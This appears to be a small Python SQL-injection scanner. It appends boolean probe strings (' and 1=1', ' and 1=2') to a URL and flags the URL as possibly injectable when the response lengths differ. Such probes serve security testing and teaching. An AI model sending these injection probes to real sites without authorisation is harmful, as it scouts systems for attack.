import requests

urlV = []


def sqlCk(url):
    global urlV
    sqlNum = [' and 1=1', ' and 1=2'] # 简单测试sql注入
    url_len = requests.get(url).headers.get('Content-Length')
    url_payload_len1 = requests.get(url + sqlNum[0]).headers.get('Content-Length')
    url_payload_len2 = requests.get(url + sqlNum[1]).headers.get('Content-Length')
    if url_len == url_payload_len1:
        if url_payload_len1 != url_payload_len2:
            urlV.append(url)
            print('可能存在的注入:' + url)
